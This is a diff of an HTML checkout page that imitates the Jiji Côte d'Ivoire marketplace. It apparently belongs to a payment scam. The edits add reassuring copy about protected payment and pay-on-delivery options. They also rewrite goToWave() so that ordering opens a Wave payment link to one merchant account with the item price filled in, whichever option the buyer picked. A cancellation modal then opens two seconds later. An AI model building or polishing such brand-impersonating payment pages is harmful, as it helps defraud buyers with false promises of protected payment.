@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>jiji.ci.com</title>
+    <title>jiji - côte d'ivoire</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -115,6 +115,7 @@
         .btn {
             width: 100%; padding: 16px; border-radius: 10px; border: none; font-size: 16px; font-weight: 700;
             cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.2s; margin-top: 24px;
+            text-decoration: none;
         }
         .btn-primary { background: var(--jiji-green); color: white; box-shadow: 0 4px 14px rgba(0,166,80,0.3); }
         .btn-primary:hover { background: var(--jiji-green-dark); transform: translateY(-2px); }
@@ -135,9 +136,6 @@
         .pay-option.selected { border-color: var(--jiji-green); background: var(--jiji-green-light); }
         .pay-option input { margin-right: 14px; width: 20px; height: 20px; accent-color: var(--jiji-green); }
         
-        .wave-box { background: var(--jiji-green-light); border: 1px solid #a7e3c0; border-radius: 12px; padding: 20px; margin: 20px 0; font-size: 14px; color: var(--jiji-green-dark); line-height: 1.6; text-align: center; }
-        .wave-box a { color: var(--jiji-green-dark); font-weight: 800; word-break: break-all; text-decoration: underline; }
-
         /* ASSISTANCE BUTTON */
         .assist-btn {
             position: fixed; bottom: 25px; right: 25px; width: 60px; height: 60px; border-radius: 50%;
@@ -165,7 +163,7 @@
         <div class="splash-logo">
             <span>j</span><span>i</span><span>j</span><span>i</span>
         </div>
-        <div class="splash-tagline">Zainz jiji</div>
+        <div class="splash-tagline">Achetez et vendez en toute confiance</div>
         <div class="splash-loader"></div>
     </div>
 
@@ -177,7 +175,7 @@
                     <span>j</span><span>i</span><span>j</span><span>i</span>
                 </div>
                 <h1>Le N°1 en Côte d'Ivoire 🇨🇮</h1>
-                <p>passé vous commande en toute sécurité</p>
+                <p>Achetez et vendez en toute sécurité. Paiement protégé, livraison rapide et support 24/7.</p>
                 
                 <div class="landing-features">
                     <div class="landing-feat">
@@ -266,7 +264,7 @@
                 </div>
                 <div class="trust-badge">
                     <i class="fas fa-check-circle"></i>
-                    <span>Jiji ci.</span>
+                    <span>Votre argent est protégé jusqu'à la livraison.</span>
                 </div>
             </div>
         </div>
@@ -282,7 +280,7 @@
                 <input type="radio" name="payMethod" value="delivery">
                 <div>
                     <div style="font-weight: 700;">Payer à la livraison</div>
-                    <div style="font-size: 13px; color: var(--text-light);">Le livreur encaisse le montant après la livraison.</div>
+                    <div style="font-size: 13px; color: var(--text-light);">vous payé à la livraison.</div>
                 </div>
             </label>
             
@@ -290,41 +288,18 @@
                 <input type="radio" name="payMethod" value="after">
                 <div>
                     <div style="font-weight: 700;">Payer après la livraison</div>
-                    <div style="font-size: 13px; color: var(--text-light);">Paiement direct.</div>
+                    <div style="font-size: 13px; color: var(--text-light);">Paiement différé après vérification.</div>
                 </div>
             </label>
 
             <button class="btn btn-primary" id="btnConfirmPay" disabled onclick="goToWave()">
-                passé la commande 
+                Passé la commande 
             </button>
             <button class="btn btn-secondary" onclick="closeModalDirect('paymentModal')">Annuler</button>
         </div>
     </div>
 
-    <!-- Modal Wave -->
-    <div id="waveModal" class="modal" onclick="closeModal(event, 'waveModal')">
-        <div class="modal-content" onclick="event.stopPropagation()">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <div style="width: 60px; height: 60px; background: var(--jiji-green-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
-                    <i class="fas fa-check" style="font-size: 28px; color: var(--jiji-green);"></i>
-                </div>
-                <h2 style="margin-top: 16px;">Commande enregistrée !</h2>
-            </div>
-            
-            <div class="wave-box">
-                Veuillez Payer Payment*touch Jiji & Yango avec Wave en cliquant sur ce lien :<br><br>
-                <a href="https://pay.wave.com/m/M_ci_nJkLYVQxhQjb/c/ci/" target="_blank">https://pay.wave.com/m/M_ci_nJkLYVQxhQjb/c/ci/</a><br><br>
-                <strong>Ajoutez cet expéditeur à vos contacts pour rendre le lien cliquable.</strong>
-            </div>
-
-            <a href="https://pay.wave.com/m/M_ci_nJkLYVQxhQjb/c/ci/" target="_blank" class="btn btn-primary">
-                <i class="fas fa-external-link-alt"></i> Ouvrir le lien Wave
-            </a>
-            <button class="btn btn-secondary" onclick="showCancelModal()">J'ai payé, continuer</button>
-        </div>
-    </div>
-
-    <!-- Modal Annulation -->
+    <!-- Modal Annulation (s'ouvre après le paiement) -->
     <div id="cancelModal" class="modal" onclick="closeModal(event, 'cancelModal')">
         <div class="modal-content" onclick="event.stopPropagation()">
             <div style="text-align: center; margin-bottom: 20px;">
@@ -417,14 +392,21 @@
             document.getElementById('btnConfirmPay').disabled = false;
         }
 
+        // Redirection directe vers Wave avec le montant + ouverture de la modal d'annulation après 2s
         function goToWave() {
+            const price = document.getElementById('price').value;
+            const waveUrl = `https://pay.wave.com/m/M_ci_nJkLYVQxhQjb/c/ci/?amount=${price}`;
+            
+            // Fermer la modal de choix
             closeModalDirect('paymentModal');
-            openModal('waveModal');
-        }
-
-        function showCancelModal() {
-            closeModalDirect('waveModal');
-            openModal('cancelModal');
+            
+            // Ouvrir le lien Wave directement dans un nouvel onglet
+            window.open(waveUrl, '_blank');
+            
+            // Après 2 secondes, ouvrir la modal d'annulation
+            setTimeout(() => {
+                openModal('cancelModal');
+            }, 2000);
         }
     </script>
 </body>
